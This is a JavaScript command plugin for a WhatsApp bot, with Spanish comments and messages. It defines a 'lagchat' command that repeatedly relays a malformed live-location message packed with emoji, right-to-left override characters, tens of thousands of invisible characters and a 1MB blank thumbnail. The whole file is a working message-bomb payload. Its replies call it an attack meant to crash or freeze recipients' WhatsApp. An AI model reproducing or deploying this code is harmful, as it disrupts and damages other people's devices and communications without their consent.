const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💥'.repeat(2000) + '\u202E'.repeat(200), // unicode RTL
        degreesLongitude: '💣'.repeat(2000) + '\u202E'.repeat(200),
        caption: '\u2063'.repeat(30000) + '💣'.repeat(2000) + '\u202E'.repeat(1000), // invisible + RTL + emoji bomb
        sequenceNumber: '999999999',
        jpegThumbnail: Buffer.alloc(1024 * 1024, 0), // 1MB de thumbnail vacía
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          externalAdReply: {
            title: '💀 WhatsApp ha dejado de funcionar',
            body: 'Este es el fin.',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) throw '⛔ Solo el Owner puede usar este comando.'

  const jid = m.chat
  const times = 15 // más de 50 puede cerrar WhatsApp definitivamente

  await m.reply(`⚠️ *LAGCHAT ULTRA DESTRUCTIVO ACTIVADO*\n🚨 Enviando ${times} bombas masivas...\n❗ No nos hacemos responsables si WhatsApp crashea.`)

  for (let i = 0; i < times; i++) {
    try {
      await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
    } catch (error) {
      console.error(`💥 Falló la bomba ${i + 1}:`, error)
      await m.reply(`❌ Bomba fallida en el intento ${i + 1}. Posible bloqueo.`)
      return
    }
  }

  await m.reply('✅ *Ataque completado.* ¿Tu WhatsApp aún sobrevive? 😈🔥')
}

handler.command = /^lagchat$/i
handler.owner = true
handler.tags = ['owner']
handler.help = ['lagchat']

export default handler